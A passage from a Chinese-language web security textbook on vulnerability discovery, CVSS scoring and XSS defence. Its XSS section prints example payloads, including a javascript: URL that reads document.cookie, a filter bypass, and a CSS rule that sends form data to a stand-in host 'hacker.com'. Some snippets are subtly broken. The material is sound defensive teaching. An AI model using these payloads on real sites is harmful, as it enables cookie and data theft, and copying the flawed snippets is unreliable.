这些工具中的每一个都可以配置为分析包含文本并代表代码文件的文档语法。这些工具中没有一个会实际执行代码，因为那会将它们归入被称为动态分析或有时称为运行时分析的下一个类别。静态分析工具应该配置为寻找常见的 OWASP Top 10 漏洞。

许多此类工具针对主流语言以免费和付费的形式存在。静态分析工具也可以从头编写——但在规模化的代码库上，内部自研的工具往往表现不佳。

例如，以下漏洞利用通常可以通过静态分析检测到：

**常规 XSS (General XSS)**
> 寻找使用 `innerHTML` 进行 DOM 操作的代码。

**反射型 XSS (Reflected XSS)**
> 寻找从 URL 参数提取出的变量。

**DOM 型 XSS (DOM XSS)**
> 寻找特定的 DOM 接收点，例如 `setInterval()`。

**SQL 注入 (SQL injection)**
> 寻找在查询中使用用户提供的字符串的代码。

**CSRF**
> 寻找改变状态的 GET 请求。

**DoS**
> 寻找编写不当的正则表达式（Regular Expressions）。

静态分析工具的进一步配置还可以帮助您强制执行最佳安全编码实践。例如，您的静态分析工具应该拒绝那些没有导入适当授权函数的 API 端点，或者消耗用户输入但未调用单一事实来源验证库的函数。

静态分析对于通用漏洞发现非常强大，但它也可能成为挫败感的来源，因为它会报告大量的误报（False Positives）。此外，静态分析在处理动态语言（如 JavaScript）时会受到限制。静态类型语言（如 Java 或 C#）要容易得多进行静态分析，因为工具理解预期的数据类型，并且该数据在遍历函数和类时无法改变类型。

另一方面，动态类型语言极难进行精确的静态分析。JavaScript 就是这方面的一个极好例子，因为 JavaScript 变量（包括函数、类等）是可变对象（Mutable Objects）——它们可以在任何时间点发生改变。此外，在没有类型强转（Typecasting）的情况下，很难在不进行运行时评估的情况下，理解 JavaScript 应用在任何时间的具体状态。

总而言之，静态分析工具在寻找常见漏洞和配置错误方面非常出色，特别是在静态类型编程语言方面。静态分析工具在寻找涉及深厚应用知识的高级漏洞、链路结合漏洞或动态类型语言中的漏洞时，效果并不理想。

#### 动态分析

静态分析查看代码，通常是在执行之前。另一方面，动态分析（Dynamic Analysis）在执行后查看代码。因为动态分析需要执行代码，所以它的成本要高得多，并且速度明显慢得多。在大型应用中，动态分析在发挥任何效用之前，需要一个类似于生产环境的环境（服务器、许可证等）。

动态分析在拾取实际漏洞方面非常出色，而静态分析虽然会拾取许多潜在漏洞，但确认它们的方法有限。

动态分析在分析输出并将其与描述漏洞和配置模型的模型进行比对之前，会先执行代码。这使得它非常适合测试动态语言，因为它可以看代码的输出，而不是（模糊的）输入和流程。它在寻找作为应用妥善运行的副作用而发生的漏洞方面也非常出色——例如，不当存储在内存中的敏感数据，或侧信道攻击（Side-Channel Attacks）。

动态分析工具针对许多语言和框架存在。其中的一些例子包括：

* IBM AppScan（付费）
* Veracode（付费）
* Iroh（免费）

由于在类似于生产环境的环境中运行的复杂度增加，更好的工具往往是付费的，或者需要重大的前期配置。简单的应用可以构建自己的动态分析工具，但对于 CI/CD 级别的完全自动化，它们将需要重大的投入和少许前期成本。

与静态分析工具不同，配置得当的动态分析工具应该具有更少的误报，并针对您的应用提供更深入的内省。其权衡在于，与静态分析工具相比，它在维护、成本和性能方面存在短板。

#### 漏洞回归测试

对于安全的 Web 应用而言，必不可少的最后一种自动化形式是漏洞回归测试网（Vulnerability Regression Testing nets）。静态分析和动态分析工具很酷，但与回归测试相比，它们难以设置、配置和维护。

一个漏洞回归测试套件非常简单。它的工作原理与功能或性能测试套件类似，但漏洞回归测试测试的是已知的漏洞是否依然存在。这防止了该缺陷被重新引入代码库中。

您不需要针对安全漏洞测试的专门框架。任何能够重现该漏洞的测试框架都应该胜任。 Jest，一个用于 JavaScript 应用的快速、整洁且强大的测试库。Jest 可以很容易地被修改为用于测试安全回归。

设想以下漏洞。软件工程师 Steve 在应用中引入了一个新的 API 端点，允许用户从其仪表盘的 UI 组件中按需升级或降级其成员身份：

```javascript
const currentUser = require('../currentUser');
const modifySubscription = require('../../modifySubscription');

const tiers = ['individual', 'business', 'corporation'];

/*
 * 代表当前已认证的用户发起 HTTP GET 请求。
 *
 * 接受一个参数 `newTier` 并尝试将已认证用户的订阅更新为该层级。
 */
app.get('/changeSubscriptionTier', function(req, res) {
 if (!currentUser.isAuthenticated) { return res.sendStatus(401); }
 if (!req.params.newTier) { return res.sendStatus(400); }
 if (!tiers.includes(req.params.newTier)) { return res.sendStatus(400); }

 modifySubscription(currentUser, req.params.newTier)
 .then(() => {
  return res.sendStatus(200);
 })
 .catch(() => {
  return res.sendStatus(400);
 });
});
```

Steve 的老朋友 Jed 经常对 Steve 的代码吹毛求疵，他意识到他可以使用任何层级作为 `newTier` 参数发起类似于 `GET /api/changeSubscriptionTier` 的请求，并通过超链接发送给 Steve。当 Steve 点击此链接时，代表其账户发起了一个请求，更改了其在公司应用门户中的订阅状态。

Jed 在应用中发现了一个 CSRF 漏洞。幸运的是，尽管 Steve 对 Jed 连绵不断的批评感到恼火，但他意识到了此漏洞利用的危险性，并将其报告回组织进行研判。一旦研判完毕，解决方案是将请求从 HTTP GET 切换为 HTTP POST。

不想在朋友 Jed 面前再次丢脸，Steve 编写了一个漏洞回归测试：

```javascript
const tester = require('tester');
const requester = require('requester');

/*
 * 检查 `changeSubscriptionTier` 端点的 HTTP OPTIONS。
 *
 * 如果接受了多个请求动词，或者动词不等于 'POST'，则测试失败。
 * 在超时或未成功的 Options 请求上失败。
 */
const testTierChange = function() {
 requester.options('http://app.com/api/changeSubscriptionTier')
  .on('response', function(res) {
   if (!res.headers) {
    return tester.fail();
   } else {
    const verbs = res.headers['Allow'].split(',');
    if (verbs.length > 1) { return tester.fail(); }
    if (verbs[0] !== 'POST') { return tester.fail(); }
   }
  })
  .on('error', function(err) {
   console.error(err);
   return tester.fail();
  })
};
```

这个回归测试看起来与功能测试非常相似，事实也确实如此！

功能测试与漏洞测试之间的区别不在于框架，而在于编写测试的目的。在此案例中，CSRF Bug 的解决办法是该端点应当仅接受 HTTP POST 请求。回归测试确保 `changeSubscriptionTier` 端点仅接受单个 HTTP 动词，且该动词等于 POST。如果未来的更改引入了该端点的非 POST 版本，或者修复被覆盖，则此测试将失败，表明该漏洞已经复现（Regressed）。

漏洞回归测试非常简单。有时它们如此简单，以至于可以在引入漏洞之前编写。这对于那些微小的、看起来无关紧要的更改可能会产生重大影响的代码来说非常有用。归根结底，漏洞回归测试是一种简单且有效的方法，可以防止已经关闭的漏洞再次进入您的代码库。

在可能的情况下，测试本身应该在提交或推送钩子（Commit or Push Hooks）上运行（如果测试失败，则拒绝提交或推送）。对于更复杂的版本控制环境，定期运行（每天）是第二好的选择。

### 负责任的披露计划

除了拥有妥善的自动化来捕获漏洞之外，您的组织还应该具有一个明确定义且公开的披露应用中漏洞的方式。您内部的测试可能无法涵盖您客户的所有潜在用例。正因为如此，您的客户极有可能发现原本未被报告的漏洞。

遗憾的是，有几个大型组织将来自其用户的漏洞报告转化为了针对报告者的诉讼和封口令。因为法律没有很好地定义道德研究与恶意利用之间的区别，所以除非您明确定义了负责任披露的路径，否则应用中精通技术的用户极有可能不会报告意外发现的漏洞。

一个优秀的负责任披露计划将包括一组成员列表，说明您的用户可以在不承担任何法律风险的情况下测试您应用安全性的方式。除此之外，您的披露计划应该定义明确的提交方法和优秀提交的模板。

为了降低在您的应用中修补漏洞之前被公开曝光的风险，您可以在负责任的披露计划中包含一个条款，阻止研究人员公开最近发现的漏洞。负责任的披露计划通常会列出一段时间（数周或数月），在此期间，报告者在修复漏洞的同时无法在外部讨论该漏洞。一个妥善实现的漏洞披露计划将进一步降低可利用漏洞被公开搁置的风险，并改善公众对您开发团队安全承诺的接受度。

### 漏洞赏金计划

虽然负责任的披露允许研究人员和终端用户报告在您的 Web 应用中发现的漏洞，但它并没有为实际测试您的应用和寻找漏洞提供物质激励。在过去的十年中，软件公司开始采用漏洞赏金（Bug Bounty）计划，向来自终端用户、道德黑客和安全研究人员的、提交妥善且记录完备的漏洞报告提供现金奖励。

启动漏洞赏金计划在过去是一个困难的过程，需要广泛的法律文件、研判团队，以及专门配置用于检测重复项和解决漏洞的 Sprint 或看板（Kanban）流程。今天，存在中间公司来协助漏洞赏金计划的开发和壮大。

像 HackerOne 和 Bugcrowd 这样的公司提供了易于定制的法律模板以及用于提交和研判的 Web 界面。HackerOne 是网络上最受欢迎的漏洞赏金平台之一，可以帮助小型公司设置漏洞赏金计划，并与安全研究人员及道德黑客建立联系。

除了发布正式的负责任披露政策之外，利用漏洞赏金计划还将允许自由渗透测试人员（漏洞赏金猎人）和终端用户不仅能发现漏洞，而且还能被激励去报告它们。

### 第三方渗透测试

除了建立负责任的披露系统并通过漏洞赏金计划激励披露之外，第三方渗透测试还可以让您对代码库的安全有更深入的了解，这是您无法通过自己的开发团队获得的。第三方渗透测试人员与漏洞赏金猎人类似，因为他们不直接隶属于您的组织，但能够提供对您 Web 应用安全性的洞察。漏洞赏金猎人（大多数，排除前 1% 的顶尖高手）是自由职业的渗透测试人员。他们在想工作时工作，没有特定的议程需要遵守。

另一方面，可以为渗透测试公司分配应用的特定部分进行测试——并且通过法律协议，通常可以安全地向他们提供公司源代码（以获得更精确的测试结果）。理想情况下，签约测试应该在发布到生产环境之前，针对您应用代码库的高风险和新编写的领域。发布后的测试对于代码库的高风险领域以及测试以确保安全机制在各平台之间保持恒定也同样具有价值。

### 总结

有许多方法可以发现您 Web 应用代码库中的漏洞，每种方法都有其自身的优缺点以及在应用生命周期中的位置。理想情况下，应该采用这些技术中的几种，以确保您的组织具有最大的机会，在外部黑客发现或利用严重安全漏洞之前，将其捕获并解决。

通过结合本章中描述的漏洞发现技术，并进行妥善的自动化以及反馈到您的安全软件开发生命周期（SSDL）中，您将能够自信地发布生产环境 Web 应用，而无需显著担心在生产环境中发现严重的安全漏洞。

---

## 第 27 章漏洞管理
任何优秀的安全软件开发生命周期（SSDL）流程的一部分，是用于获取、研判（Triaging）和解决在 Web 应用中发现的漏洞的、明确定义的流水线。我们在第 26 章中介绍了发现漏洞的方法，在此之前我们介绍了将 SSDL 集成到您的架构和开发阶段的方法，以减少发现的未决漏洞数量。

在大型应用中，在所有这些阶段都会发现漏洞，从架构阶段到生产代码。在架构阶段注意到的漏洞可以进行防御性编码，并且可以在编写任何代码之前开发应对措施。在架构阶段之后的任何时间发现的漏洞都需要进行妥善管理，以便它们最终能够得到修复，并且任何受影响的环境都可以使用该修复程序进行修补。这就是漏洞管理流水线发挥作用的地方。

### 重现漏洞 

在收到漏洞报告后，管理它的第一步应该是在类似于生产环境的环境中重现该漏洞。这有多个好处。首先，它允许您确定该漏洞是否确实是漏洞。有时，用户定义的配置错误看起来可能像是一个漏洞。例如，用户“不小心”在其照片托管 App 上将一张图片设为了“公开”，而他们平时通常将照片设置为“私有”。

为了高效地重现漏洞，您需要建立一个尽可能紧密模拟生产环境的预发布环境（Staging Environment）。

应用中的漏洞不仅因代码而异，还会因环境而异。重现每个报告的漏洞可以让您安全地避免在误报上浪费工程时间。此外，通过漏洞赏金计划等付费计划在外部报告的漏洞，应当进行重现，以免针对误报漏洞支付赏金。

最后，重现漏洞可以让您更深入地了解在您的代码库中可能是什么导致了该漏洞，并且是解决该漏洞的必不可少的第一步。您应该立即重现并记录您的重现结果。

在发布新功能之前，它应该在一个只能通过内部网络访问或通过某种类型的加密登录来保护的应用构建版本中可用。

### 漏洞评分

对漏洞风险进行评估是漏洞管理流程的重要部分。并非所有漏洞都带有相同程度的风险，对风险进行评估将帮助您确定在开发流水线中修复它们的优先级。

在安全工程中，通用漏洞评分系统（Common Vulnerability Scoring System，CVSS）是用于评估漏洞风险的行业标准。CVSS 是一个免费且开放的行业标准，用于评估计算机系统安全漏洞的严重性。CVSS 试图建立一种衡量漏洞所需修复努力程度的方法。

CVSS 分数范围从 0 到 10，其中 10 代表最严重的风险。CVSS 分数由三个主要度量指标（Metrics）组组成：

* **基础分数 (Base Scoring)** —— 代表漏洞本身的特征，这些特征随时间和环境保持恒定。
* **时效分数 (Temporal Scoring)** —— 代表漏洞随时间发生改变的特征（例如，可用补丁的成熟度）。
* **环境分数 (Environmental Scoring)** —— 代表特定于特定用户环境的漏洞特征。

通过使用 CVSS 基础分数，或者通过在您的组织中开发自定义的评估逻辑，您可以开始对发现的漏洞进行评分，以帮助您的组织在有限的资源下快速且高效地解决高风险漏洞。

#### CVSS：基础评分 

CVSS v3.1 基础评分算法需要八个输入指标：

* 攻击向量 (Attack Vector, AV)
* 攻击复杂度 (Attack Complexity, AC)
* 所需特权 (Privileges Required, PR)
* 用户交互 (User Interaction, UI)
* 影响范围 (Scope, S)
* 机密性影响 (Confidentiality Impact, C)
* 完整性影响 (Integrity Impact, I)
* 可用性影响 (Availability Impact, A)

这些输入中的每一个都接受几个选项之一，从而生成一个基础分数：

**攻击向量 (Attack Vector)**
> 代表攻击者利用该漏洞所需的物理或网络临近性。选项包括：网络（Network）、相邻（Adjacent）、本地（Local）和物理（Physical）。

**攻击复杂度 (Attack Complexity)**
> 代表攻击者控制利用该漏洞所需的先决条件所需付出的努力。选项包括：低（Low）和高（High）。

**所需特权 (Privileges Required)**
> 代表在成功利用漏洞之前，攻击者必须拥有的特权层级。选项包括：无（None）、低（Low）和高（High）。

**用户交互 (User Interaction)**
> 代表是否需要除攻击者外的其他人参与才能成功利用漏洞。选项包括：无（None）和需要（Required）。

**影响范围 (Scope)**
> 代表一个组件中的漏洞是否会影响其他组件。选项包括：未改变（Unchanged）和已改变（Changed）。

**机密性影响 (Confidentiality Impact)**
> 代表由于成功利用漏洞而导致的信息泄露程度。选项包括：无（None）、低（Low）和高（High）。

**完整性影响 (Integrity Impact)**
> 代表由于成功利用漏洞而导致的数据篡改程度。选项包括：无（None）、低（Low）和高（High）。

**可用性影响 (Availability Impact)**
> 代表由于成功利用漏洞而导致的服务中断程度。选项包括：无（None）、低（Low）和高（High）。

将这些分数中的每一个输入到 CVSS v3.1 算法中将产生一个 0 到 10 之间的数字。此数字是漏洞的严重程度分数，可用于优先分配用于修复的资源和时间表。它还可以帮助确定由于漏洞被利用，您的应用暴露在多大的风险之下。

CVSS 分数可以很容易地映射到不使用数字评分的其他漏洞评分框架：

* 0.1–4.0: 低严重性 (Low severity)
* 4.1–6.9: 中严重性 (Medium severity)
* 7.0–8.9: 高严重性 (High severity)
* 9.0–10.0: 严重严重性 (Critical severity)

通过使用 CVSS v3.1 算法，或网络上众多的基于 Web 的 CVSS 计算器之一，您可以开始对发现的漏洞进行评分，以协助您的组织以有效的方式优先分配和解决风险。

#### CVSS：时效评分 (CVSS: Temporal Scoring)

CVSS 中的时效评分很简单，但由于复杂的措辞，它听起来可能令人望而生畏。时效分数向您展示了在报告漏洞时，鉴于漏洞在报告时的状态，您的组织在处理漏洞方面的装备有多好。

时效分数有三个类别：

**可利用性 (Exploitability)**
> 接受从“未证实”（unproven）到“高”（high）的值。此度量指标试图确定报告的漏洞仅仅是一个理论或概念验证（需要迭代才能转变为实际可用的漏洞），还是该漏洞可以原封不动地进行部署和使用（可工作的漏洞）。

**修复级别 (Remediation Level)**
> 修复级别接受一个代表可用缓解措施水平的值。一个带有可运行且经过测试的修复程序的报告漏洞将被授予 "O" 代表 "Official Fix"（官方修复），而一个没有已知解决方案的漏洞将被授予 "U" 代表 "Unavailable"（不可用）。

**报告可信度 (Report Confidence)**
> 报告可信度度量指标有助于确定漏洞报告的质量。一个没有重现代码或没有理解如何开始重现流程的理论报告将呈现为“未知”（Unknown）的可信度，而一个带有重现和描述的精心撰写的报告将呈现为“确认”（Confirmed）的报告可信度。

时效分数遵循相同的评分范围（0–10），但它衡量的不是漏洞本身，而是已有的缓解措施以及漏洞报告的质量和可靠性。

#### CVSS：环境评分

CVSS 环境分数详述了您的特定环境（特定于您的应用），以便理解如果黑客利用它们，哪些数据或操作会对您的组织产生最大的风险。

环境评分算法采用了基础分数的所有输入，但增加了三个详述机密性、完整性和可用性对您应用重要性的要求。

这三个新字段如下：

**机密性要求 (Confidentiality Requirement)**
> 您的应用所需的机密性层级。免费提供的公共应用可能会得分较低，而具有严格合同要求（医疗、政府）的应用可能会得分较高。

**完整性要求 (Integrity Requirement)**
> 攻击者在您的组织中更改应用状态所带来的影响。一个生成旨在被丢弃的测试沙箱的应用，其得分要低于一个存储关键公司税务记录的应用。

**可用性要求 (Availability Requirement)**
> 停机时间对应用带来的影响。一个被期望 24/7 在线的应用所受的影响，要大于一个没有在线承诺的应用。

环境分数是相对于您的应用要求对漏洞进行评分，而基础分数是在真空中单独对漏洞本身进行评分。

#### 高级漏洞评分

使用 CVSS 或另一个经过充分测试的开放评分系统作为起点，您可以开始开发和测试您自己的评分系统。这允许在您的特定业务模型和应用架构方面获得更相关的信息。

> 如果您的 Web 应用与物理技术（如硬件设备）进行交互，您可能希望开发自己的评分算法，以包含与连接的 Web 应用相伴而来的风险。
>
> 例如，由 Web 门户控制的安全摄像头如果其系统失陷，将具有额外的含义，因为这可能会泄露其租户的敏感照片或视频——甚至可能会触犯法律。

与物联网（IoT）设备连接或通过其他方式交付的应用，可能希望从一开始就着手开发自己的评分系统。

任何评分系统都应该随着时间的推移进行评估，这基于它在防止对您的应用、其子系统和您的组织造成损害方面的能力。

### 研判与评分之外 

在漏洞被妥善重现、评分和研判之后，它需要得到修复。评分可以作为优先解决修复的度量指标，但它不能是唯一的度量指标。还必须考虑其他以业务为中心的度量指标，例如客户合同和业务关系。

正确修复漏洞与正确寻找和研判漏洞同样重要。只要有可能，漏洞都应该通过永久的、应用范围的解决方案来解决。如果漏洞不能（暂时）以这种方式解决，应该添加临时修复，但应该开启一个新的 Bug，详述您应用中仍然脆弱的攻击面。

除非先开启了另一个详述剩余修复及相应分数的 Bug，否则绝不要发送部分修复并关闭 Bug（在您使用的任何 Bug 跟踪软件中）。过早关闭 Bug 可能会导致数小时的重复工作和技术理解的流失。此外，并非所有漏洞都会被报告。随着您的应用暴露的功能增加（攻击面扩大），漏洞对您组织带来的风险也会随之增加。

最后，每个关闭的安全 Bug 都应该附带一个发送的回归测试。随着代码库的大小和功能集的指数级增长，进行回归测试的机会也成倍增加，回归测试随着时间的推移会变得越来越有价值。

### 总结 

漏洞管理是一项非常重要但又非常具体的任务的组合。

首先，漏洞需要由工程师重现并记录文档。这允许组织确定报告是否有效，并理解影响是否比最初报告的更深。此流程还应该提供关于解决漏洞所需努力程度的洞察。

接下来，应该根据某种评分系统对漏洞进行评分，这允许您的组织确定漏洞让您的应用暴露在多大的风险之下。用于此目的的评分系统并不像其与您业务模型的相关性，以及其准确预测利用可能对您的应用造成损害的能力那样重要。

在妥善重现和评分漏洞（“研判”步骤）之后，必须解决漏洞。理想情况下，漏洞应该通过一个横跨整个应用攻击面且经过充分测试以避免边缘案例的妥善修复来解决。当这不可行时，应该部署部分修复，并应该提交详述仍然脆弱的攻击面的额外 Bug。

最后，随着每个 Bug 被解决，应该编写一个妥善的安全回归测试，以便该 Bug 无法在日后被意外重新打开或重新实现。

成功遵循这些步骤将极大地减少您的组织在发现漏洞时暴露在外的风险，并协助您的组织根据漏洞在您组织中可能造成的潜在损害，快速且高效地解决漏洞。



---

## 第 28 章防御 XSS 攻击
在第 10 章中，我们深入讨论了利用浏览器在用户设备上执行 JavaScript 代码能力的跨站脚本（Cross-Site Scripting，XSS）攻击。XSS 漏洞广泛存在且具有重大危害，因为脚本执行漏洞具有广泛的潜在破坏力。

幸运的是，虽然 XSS 经常出现在 Web 上，但通过安全编码最佳实践和特定的 XSS 缓解技术，可以很容易地对其进行缓解或完全预防。本章重点讨论如何保护您的代码库免受 XSS 的侵害。

### 防御 XSS 的编码最佳实践

您可以在开发团队中实施的一项用于显著降低遇到 XSS 漏洞概率的重要规则是：“除非作为字符串，否则不允许将任何用户提供的数据传递给 DOM。”

这种规则可能不适用于所有应用，因为许多应用具有包含“用户到 DOM”数据传输的功能。在这种情况下，我们可以使这条规则更具体：“绝不允许将任何未经净化的用户提供的数据传递到 DOM 中。”

允许用户提供的数据填充文档对象模型（Document Object Model，DOM）应该是一个退而求其次的、最后的选择，而不是首选。此类功能在无意中会导致 XSS 漏洞，因此，当有其他选择可用时，应首先选择它们。

当必须将用户提供的数据传递给 DOM 时，如果可能，应该将其作为字符串传递。这意味着，在不需要 HTML/DOM、而用户提供的数据被传递给 DOM 仅用于显示为文本的任何情况下，我们必须确保用户提供的数据被解释为文本而不是 DOM。

我们可以在客户端和服务器上通过多种方式执行这些检查。

首先，在 JavaScript 中进行字符串检测非常简单：

```javascript
const isString = function(x) {
 if (typeof x === 'string' || x instanceof String) {
 return true;
 }
 return false;
};
```

遗憾的是，此检查在检查数字时会失败——这是一个处理起来可能令人烦恼的边缘案例，因为数字同样可以安全地注入到 DOM 中。

我们可以将字符串和数字分类为“类字符串”（string-like）对象。我们可以利用 `JSON.parse()` 一个相对不为人知的副作用来评估“类字符串”对象：

```javascript
const isStringLike = function(x) {
 try {
 return JSON.stringify(JSON.parse(x)) === x;
 } catch (e) {
 console.log('not string-like');
 }
};
```

`JSON.parse()` 是 JavaScript 内置的一个函数，尝试将文本转换为 JSON 对象。数字和字符串将通过此检查，但复杂对象（如函数）将失败，因为它们不符合与 JSON 兼容的格式。

最后，我们必须确保即使在我们拥有字符串对象或类字符串对象时，DOM 也会将其解释为字符串/类字符串。这是因为字符串对象本身虽然不是 DOM，但仍然可以被解释为 DOM 或转换为 DOM，这是我们希望避免的。

通常，我们使用 `innerText` 或 `innerHTML` 将用户数据注入到 DOM 中。当不需要 HTML 标签时，`innerText` 要安全得多，因为它通过将任何看起来像 HTML 标签的内容表示为字符串来尝试对其进行净化（Sanitization）。

较不安全：

```javascript
const userString = '<strong>hello, world!</strong>';
const div = document.querySelector('#userComment');
div.innerHTML = userString; // 标签被解释为 DOM
```

更安全：

```javascript
const userString = '<strong>hello, world!</strong>';
const div = document.querySelector('#userComment');
div.innerText = userString; // 标签被解释为字符串
```

在将真正的字符串或类字符串对象追加到 DOM 时，使用 `innerText` 而不是 `innerHTML` 是一项最佳实践，因为 `innerText` 会执行其自身的净化，以便将 HTML 标签视为字符串。`innerHTML` 不会这样做，它在加载到 DOM 中时会将 HTML 标签解释为 HTML 标签。经净化的 `innerText` 并非万无一失；每个浏览器在具体实现上都有其自身的变体。通过快速的互联网搜索，您可以找到各种当前和历史上的绕过净化（Bypass）的方法。

### 净化用户输入

有时您将无法依赖像 `innerText` 这样有用的工具来帮助您净化用户输入。当您需要允许某些 HTML 标签而不允许其他标签时，这种情况尤为常见。例如，您可能希望允许 `<strong></strong>` 和 `<i></i>`，但不允许 `<script></script>`。在这些情况下，您要确保在将用户提交的数据注入到 DOM 之前，对其进行广泛的净化。

当将字符串注入到 DOM 中时，您需要确保不存在恶意标签。您还想确保不存在任何逃逸净化函数的尝试。

例如，让我们假设您的净化器阻断了单引号和双引号以及 script 标签。您仍然可能会遇到这个问题：

```html
<a href="javascript:alert(document.cookie)">click me</a>
```

DOM 规范庞大而复杂，因此像这样可以执行脚本的情况比您预期的要常见得多。在此案例中，一种特定的 URL 方案（您应该始终避免使用它）被称为 JavaScript 伪协议（Pseudoscheme），它允许在不需要任何 script 标签或引号的情况下执行字符串。

使用这种方法配合其他 DOM 方法，您甚至可以绕过对单引号和双引号的过滤：

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a>
```

上述代码将弹窗警报“XSS”，就好像它是一个字面字符串一样，因为该字符串源自 `String.fromCharCode()` API。

如您所见，净化实际上非常困难。事实上，完全净化是极其困难的。此外，DOM 型 XSS 甚至更难缓解，因为它依赖于超出您控制的方法（除非您在渲染之前进行广泛的填充（Polyfill）并冻结对象）。

对于净化中的 DOM API，请注意：任何将文本转换为 DOM 或将文本转换为脚本的 API 都是潜在的 XSS 攻击向量。在可能的情况下，请远离以下 API：

* `element.innerHTML`/`element.outerHTML`
* `Blob`
* `SVG`
* `document.write`/`document.writeln`
* `DOMParser.parseFromString`
* `document.implementation`

#### DOMParser 接收点

上述 API 允许开发人员轻松地从文本生成 DOM 或脚本，因此它们是执行 XSS 的简易接收点（Sinks）。让我们看一看 `DOMParser`：

```javascript
const parser = new DOMParser();
const html = parser.parseFromString('<script>alert("hi");</script>');
```

此 API 将 `parseFromString` 中字符串的内容加载到反映输入字符串结构的 DOM 节点中。这可用于向页面填充来自服务器的结构化 DOM，当您希望将复杂的 DOM 字符串转换为妥善组织的 DOM 节点时，这可能是有益的。

然而，使用 `document.createElement()` 手动创建每个节点并使用 `document.appendChild(child)` 组织它们所带来的风险要小得多。您现在控制的是 DOM 的结构和标签名称，而 Payload 仅控制内容。

#### SVG 接收点

像 `Blob` 和 `SVG` 这样的 API 作为接收点具有重大风险，因为它们存储任意数据，但仍能够执行代码：

```html
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
 <circle cx="250" cy="250" r="50" fill="red" />
 <script type="text/javascript">console.log('test');</script>
</svg>
```

可缩放矢量图形（SVG）非常适合在大量设备上一致地显示图像。然而，由于它们依赖于允许执行脚本的 XML 规范，因此它们比其他类型的图像风险要大得多。

我们在第二部分中看到，我们可以使用图像标签 `<img>` 来发起 CSRF 攻击，因为 `<img>` 标签支持 `href`。SVG 可以在 onload 时发起任何类型的 JavaScript，这使它们变得更加危险。

#### Blob 接收点

`Blob` 也带有相同的风险：

```javascript
// 创建带有脚本引用的 blob
const blob = new Blob([script], { type: 'text/javascript' });
const url = URL.createObjectURL(blob);

// 将脚本注入页面以执行
const script = document.createElement('script');
script.src = url;

// 将脚本加载到页面中
document.body.appendChild(script);
```

此外，blob 可以以多种格式存储数据；作为 blob 的 Base64 仅仅是任意数据的容器。因此，如果可能的话，最好将 blob 排除在您的代码之外，特别是如果任何 blob 实例化过程涉及用户数据的话。

#### 净化超链接

让我们假设您想允许创建连接到源自用户输入的页面的 JavaScript 按钮：

```html
<button onclick="goToLink()">click me</button>
```

```javascript
const userLink = "<script>alert('hi')</script>";
const goToLink = function() {
 window.location.href = `https://mywebsite.com/${userLink}`;
 // 跳转到: https://mywebsite.com/<script>alert('hi')</script>
};
```

我们已经讨论过 JavaScript 伪协议可能导致脚本执行的情况，但我们还想确保任何类型的 HTML 都经过净化。在此案例中，我们可以利用现代浏览器针对 `<a></a>` 链接所具有的一些健壮的过滤机制，即使我们的脚本正在手动控制导航：

```javascript
const userLink = "<script>alert('hi')</script>";
const goToLink = function() {
 const dummy = document.createElement('a');
 dummy.href = userLink;
 window.location.href = `https://mywebsite.com/${dummy.a}`;
 // 跳转到: https://mywebsite.com/%3Cstrong%3Etest%3C/strong
};
goToLink();
```

如您所见，主流浏览器中内置了针对 `<a></a>` 中 script 标签的净化，作为防御此类链接的一种手段。跳转页上解析 `window.location.href` 的脚本可能容易受到 `goToLink()` 版本 #1 的攻击。通过创建一个虚拟的 `<a></a>`，我们可以再次利用经过充分测试的浏览器净化，从而导致标签被净化和过滤。

此方法带来了更多好处，因为它对方案进行净化，以仅允许对 `<a></a>` 标签合法的某些方案，并防止跳转到无效或不当的 URL。我们可以利用对标签使用的过滤机制来实现更具体的用例：

```javascript
encodeURIComponent('<strong>test</strong>'); // %3Cstrong%3Etest%3C%2Fstrong%3E
```

理论上存在逃逸这些编码函数的可行性，但它们经过了非常充分的测试，并且可能比自研的解决方案安全得多。

请注意，`encodeURIComponent()` 不能用于整个 URL 字符串，因为它将不再符合 HTTP 规范，因为作为源（Origin）的方案（`scheme + :// + hostname + : + port`）在被编码后无法被浏览器解释（它变成了不同的源）。

### HTML 实体编码

另一种预防措施是对用户提供的数据中存在的所有 HTML 标签执行 HTML 实体编码（HTML Entity Encoding）。实体编码允许您指定字符以在浏览器中显示，从而使它们无法被解释为 JavaScript。实体编码的“大五类”（Big Five）如表 28-1 所示。

*表 28-1. 实体编码的五个核心字符*

| 字符 | 实体编码    |
| :--- | :---------- |
| &    | `& + amp;`  |
| <    | `& + lt;`   |
| >    | `& + gt;`   |
| "    | `& + #034;` |
| '    | `& + #039;` |

在进行这些转换时，您不会冒改变浏览器中显示逻辑的风险（`& + amp;` 将显示为 “&”），但您极大地降低了在涉及实体编码绕过的复杂和罕见场景之外的脚本执行风险。

实体编码**不会**保护注入到 `<script></script>` 标签、CSS 或 URL 内部的任何内容。它仅能保护注入到 `<div></div>` 或类似 `<div></div>` 的 DOM 节点内部的内容。这是因为可以以特定顺序创建 HTML 实体编码字符串的字符串，从而使部分字符串仍然是有效的 JavaScript。

### CSS XSS

虽然 CSS 通常被认为是一种“仅用于显示”的技术，但 CSS 规范的健壮性使其成为高水平黑客的目标，作为交付 XSS 和其他类型攻击 Payload 的替代方法。我们已经广泛讨论了用户希望在服务器中存储数据、随后可以由客户端请求以供其他用户阅读的用例。此功能的基本示例是视频或博客帖子上的评论表单。

同样，一些网站提供了使用 CSS 样式的此类流程。用户上传他们创建的样式表以自定义他们的用户个人资料。当其他用户访问他们的个人资料时，他们会下载自定义的样式表以查看个性化的个人资料。

虽然 CSS 作为一种由浏览器解释的语言，不如像 JavaScript 这样的真正编程语言那样健壮，但 CSS 仍有可能被用作攻击向量以便从网页中窃取数据。

回想一下我们之前使用 `<img></img>` 标签发起针对恶意 Web 服务器的 HTTP GET 请求时的情形吗？任何时候，只要页面中加载了来自另一个源的图像，就会发出一个 GET 请求——无论是来自 HTML、JS 还是 CSS。

在 CSS 中，我们可以使用 `background:url` 属性从提供的域名加载图像。因为这是一个 HTTP GET，它也可以包含查询参数（Query Params）。

CSS 还允许根据表单的条件进行选择性样式设置。这意味着我们可以根据表单字段的状态改变 DOM 中元素的背景：

```css
#income[value=">100k"] {
 background:url("https://www.hacker.com/incomes?amount=gte100k");
}
```

如您所见，当收入按钮设置为 `>100k` 时，CSS 背景发生改变，发起了一个 GET 请求并将表单数据泄露给了另一个网站。

